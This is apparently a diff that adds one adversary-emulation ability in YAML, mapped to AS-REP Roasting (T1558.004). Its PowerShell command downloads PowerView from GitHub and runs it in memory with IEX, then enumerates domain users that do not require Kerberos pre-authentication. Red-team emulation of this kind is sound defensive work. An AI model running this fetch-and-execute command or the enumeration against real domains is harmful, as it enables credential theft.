@@ -1,0 +1,24 @@
+---
+- id: e0c75b4cc32124ef4c61508694fd0808
+  name: Get-DomainUser with PowerView
+  description: 'Utilizing PowerView, run Get-DomainUser to identify domain users.
+    Upon execution, progress and info about users within the domain being scanned
+    will be displayed.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname
+          -Verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
